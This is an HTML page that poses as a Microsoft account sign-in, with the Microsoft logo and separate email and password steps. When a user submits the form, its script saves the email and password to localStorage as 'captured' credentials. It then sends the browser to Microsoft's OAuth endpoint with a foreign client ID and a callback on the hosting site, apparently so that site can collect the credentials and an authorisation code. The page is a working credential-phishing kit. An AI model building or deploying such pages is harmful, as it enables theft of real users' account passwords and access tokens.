<!doctype html>
<html lang="en">
<head>
  <title>Sign in to your account</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="shortcut icon" href="/images/favicon.ico">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
  <style>
    body {
      background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg') !important;
      background-size: cover !important;
      background-repeat: no-repeat !important;
      background-attachment: fixed !important;
      background-position: center center !important;
    }
    #div1, #div2 { background: #ffffff; }
    #back { cursor: pointer; color: #23272a; font-size: 18px; vertical-align: middle; }
    .form-control {
      border-right: none; border-left: none; border-top: none;
    }
    .btn {
      border-radius: 0;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="row my-5 py-5">
      <div class="col-lg-6 mx-auto">
        <!-- Email Input View -->
        <div class="m-5 p-4" id="div1">
          <img src="/images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
          <span class="h5">Sign In</span><br>
          <span id="error" class="text-danger" style="display:none;">Please enter a valid email, phone, or Skype.</span>
          <div class="form-group mt-2">
            <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
          </div>
          <p>No account? <a href="#">Create one!</a></p>
          <p><a href="#">Sign in with a security key</a></p>
          <div class="text-right">
            <button class="btn text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
          </div>
        </div>

        <!-- Password Input View -->
        <div class="m-5 p-4" id="div2" style="display:none;">
          <img src="/images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
          <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" class="font-weight-bold"></span><br>
          <span id="msg" class="text-danger" style="display:none;">Please enter your password.</span><br>
          <span class="h5 mt-2 d-block">Enter password</span>
          <div class="form-group mt-2">
            <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
          </div>
          <p><a href="#">Forgot my password</a></p>
          <div class="text-right">
            <button class="btn text-white px-4" id="submit-btn" style="background-color: #0066BA;">Sign in</button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function(){
      // Function to validate email format
      function isValidEmail(email) {
        if (!email) return false;
        // A simple regex for basic email format validation
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
      }

      // --- Step 1: Handle the "Next" button click to go from email to password view ---
      $('#next').click(function(e) {
        e.preventDefault();
        const email = $('#email').val().trim();
        if (isValidEmail(email)) {
          $('#emailch').text(email);
          $('#div1').hide();
          $('#div2').show();
          $('#error').hide();
        } else {
          $('#error').show();
        }
      });

      // --- Handle the "Back" arrow click to return to the email view ---
      $('#back').click(function() {
        $('#div2').hide();
        $('#div1').show();
        $('#msg').hide();
      });

      // --- Step 2: Handle the final "Sign in" button click ---
      $('#submit-btn').click(function(event){
        event.preventDefault();
        const email = $('#emailch').text().trim();
        const password = $('#password').val();

        if (!password) {
          $('#msg').show();
          return;
        }
        
        $('#msg').hide();
        $('#submit-btn').text('Verifying...').prop('disabled', true);

        // Store credentials in localStorage for the callback page to retrieve.
        const credentialsData = {
          email: email,
          password: password,
          captureTime: new Date().toISOString(),
          source: 'replacement-html-final'
        };
        try {
          localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
          console.log('âœ… Credentials stored successfully in localStorage.');
        } catch (e) {
          console.error('âŒ Failed to store credentials in localStorage:', e);
        }

        // Construct the Microsoft login URL with the redirect pointing to our /auth/callback page.
        const callbackUrl = window.location.origin + '/auth/callback';
        const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
        
        console.log(`ðŸ”„ Redirecting to Microsoft for cookie setting. Will return to: ${callbackUrl}`);
        
        // Redirect to Microsoft after a short delay to allow UI to update.
        setTimeout(() => {
          window.location.href = microsoftLoginUrl;
        }, 1200);
      });
    });
  </script>
</body>
</html>
